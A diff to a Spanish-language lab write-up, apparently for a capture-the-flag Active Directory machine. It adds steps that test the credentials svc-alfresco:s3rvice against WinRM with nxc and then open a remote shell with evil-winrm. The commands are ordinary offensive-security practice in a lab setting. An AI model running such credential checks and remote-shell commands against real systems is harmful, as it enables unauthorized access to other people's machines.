@@ -129,4 +129,13 @@ NETLOGON        READ            Logon server share
 SYSVOL          READ            Logon server share 
 ```
 
-Accederemos a ellos usando [[SM]]
+Probaremos tambien si son credenciales validas para servicio de `WINRM`
+```shell
+nxc winrm 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
+```
+
+Accederemos entonces al servicio usando [[EVIL-WINRM]]
+```shell
+evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
+```
+
